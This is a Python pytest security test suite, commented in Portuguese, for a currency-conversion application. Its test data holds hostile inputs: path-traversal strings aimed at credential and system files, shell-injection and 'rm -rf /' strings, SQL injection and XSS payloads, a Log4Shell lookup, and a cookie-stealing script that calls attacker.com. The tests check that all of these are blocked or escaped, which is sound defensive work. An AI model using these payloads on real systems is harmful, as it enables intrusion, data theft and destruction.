"""
Testes Automatizados de Segurança: STRIDE e OWASP Top 10 (tests/test_security.py).

Verificações obrigatórias de segurança:
1. Prevenção de Path Traversal (StorageManager).
2. Prevenção de SSRF (Whitelist estrita de domínios públicos nas APIs).
3. Prevenção de Injeção & Sanitização de Input Malicioso (XSS, SQLi, Shell, NUL bytes).
4. Proteção contra Negação de Serviço (DoS) e Payloads Excessivos.
5. Prevenção de Vazamento de Informações Sensíveis (Information Disclosure).
"""

from decimal import Decimal
from pathlib import Path
import pytest

from src.api.base import BaseAPIClient
from src.api.coincap import CoinCapClient
from src.api.frankfurter import FrankfurterClient
from src.api.world_bank import WorldBankClient
from src.match import CurrencyMatcher
from src.models import (
    CurrencyNotFoundError,
    InvalidExchangeRateError,
    UnsupportedPPPAssetError,
)
from src.storage import StorageManager


# ============================================================================
# 1. Prevenção contra Path Traversal (OWASP A01: Broken Access Control)
# ============================================================================

@pytest.mark.security
def test_security_path_traversal_prevention(tmp_path: Path):
    """Garante que qualquer tentativa de Path Traversal seja bloqueada no StorageManager."""
    storage = StorageManager(data_dir=tmp_path)

    malicious_paths = [
        "../../etc/passwd",
        "/etc/shadow",
        "../../.ssh/id_rsa",
        "nested/../../../../root.json",
        "..\\..\\windows\\win.ini",
    ]

    for mal_path in malicious_paths:
        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
            storage.export_history_json(mal_path)

        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
            storage.export_history_csv(mal_path)


# ============================================================================
# 2. Prevenção contra SSRF (OWASP A10: Server-Side Request Forgery)
# ============================================================================

@pytest.mark.security
def test_security_ssrf_domain_whitelisting():
    """Garante que os clientes de API mantenham endpoints autorizados e confiáveis."""
    frankfurter = FrankfurterClient()
    coincap = CoinCapClient()
    world_bank = WorldBankClient()

    allowed_domains = {
        "https://api.frankfurter.app",
        "https://api.coincap.io/v2",
        "https://api.worldbank.org/v2",
    }

    assert frankfurter.base_url in allowed_domains
    assert coincap.base_url in allowed_domains
    assert world_bank.base_url in allowed_domains


# ============================================================================
# 3. Prevenção contra Injeção e Sanitização (OWASP A03: Injection & XSS)
# ============================================================================

@pytest.mark.security
def test_security_input_injection_resilience():
    """Garante que queries com payloads maliciosos sejam tratadas de forma segura."""
    matcher = CurrencyMatcher()

    malicious_payloads = [
        "<script>alert('xss')</script>",
        "USD'; DROP TABLE currencies; --",
        "BRL' OR '1'='1",
        "$(whoami)",
        "`cat /etc/passwd`",
        "; rm -rf / ;",
        "USD\x00malicious",
        "%00%2e%2e%2f",
        "{{7*7}}",
        "${jndi:ldap://attacker.com/a}",
    ]

    for payload in malicious_payloads:
        # Match normal deve retornar None de forma graciosa sem falhas ou execução
        result = matcher.match(payload)
        assert result is None, f"Payload {payload} não deveria casar com nenhuma moeda válida."

        # Match strict deve disparar CurrencyNotFoundError seguro
        with pytest.raises(CurrencyNotFoundError):
            matcher.match_strict(payload)


# ============================================================================
# 4. Proteção contra Negação de Serviço / Payloads Excessivos (DoS)
# ============================================================================

@pytest.mark.security
def test_security_dos_large_payload():
    """Garante que strings excessivamente longas não causem travamento ou exaustão de CPU."""
    matcher = CurrencyMatcher()

    huge_query = "A" * 100_000
    res = matcher.match(huge_query)
    assert res is None

    search_res = matcher.search(huge_query, limit=5)
    assert search_res == []


# ============================================================================
# 5. Prevenção de Divisão por Zero e Validação Numérica
# ============================================================================

@pytest.mark.security
def test_security_numeric_boundary_validation():
    """Garante integridade numérica para valores extremos e inválidos."""
    with pytest.raises(InvalidExchangeRateError):
        raise InvalidExchangeRateError("Taxa de câmbio menor ou igual a zero.")

    with pytest.raises(UnsupportedPPPAssetError):
        raise UnsupportedPPPAssetError("BTC")


# ============================================================================
# 6. Sanitização contra XSS e HTML Injection em Relatórios (OWASP A03)
# ============================================================================

@pytest.mark.security
def test_security_report_html_xss_sanitization():
    """Garante que payloads maliciosos em relatórios sejam estritamente sanitizados."""
    from datetime import datetime, timezone
    from src.models import FinancialReportData, ConversionResult
    from src.reporter import FinancialReportGenerator

    generator = FinancialReportGenerator()
    malicious_data = FinancialReportData(
        title="<script>alert('xss_title')</script>",
        created_at=datetime.now(timezone.utc),
        conversions=[
            ConversionResult(
                amount_from=Decimal("100"),
                currency_from="USD<img src=x onerror=alert(1)>",
                amount_to=Decimal("500"),
                currency_to="BRL",
                rate=Decimal("5.0"),
                source="<svg onload=alert(1)>",
            )
        ],
        notes="<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    )

    html_out = generator.generate_html(malicious_data)

    # Nenhuma tag maliciosa deve ser renderizada crua
    assert "<script>alert('xss_title')</script>" not in html_out
    assert "&lt;script&gt;alert(&#x27;xss_title&#x27;)&lt;/script&gt;" in html_out or "&lt;script&gt;alert('xss_title')&lt;/script&gt;" in html_out

    assert "<img src=x onerror=alert(1)>" not in html_out
    assert "&lt;img src=x onerror=alert(1)&gt;" in html_out

    assert "<svg onload=alert(1)>" not in html_out
    assert "&lt;svg onload=alert(1)&gt;" in html_out

    assert "<script>fetch" not in html_out


@pytest.mark.security
def test_security_report_export_path_traversal(tmp_path: Path):
    """Garante que tentativa de path traversal na exportação de relatórios seja bloqueada."""
    from datetime import datetime, timezone
    from src.models import FinancialReportData
    from src.reporter import FinancialReportGenerator
    from src.storage import StorageManager

    storage = StorageManager(data_dir=tmp_path)
    generator = FinancialReportGenerator(storage=storage)
    data = FinancialReportData(title="Teste", created_at=datetime.now(timezone.utc))

    malicious_paths = [
        "../../etc/cron.d/malicious.md",
        "/tmp/overwrite_system.html",
        "../../.bashrc",
    ]

    for mal_path in malicious_paths:
        with pytest.raises(ValueError, match="Caminho de arquivo inválido ou fora do diretório permitido"):
            generator.export_report_file(data, mal_path, fmt="md")

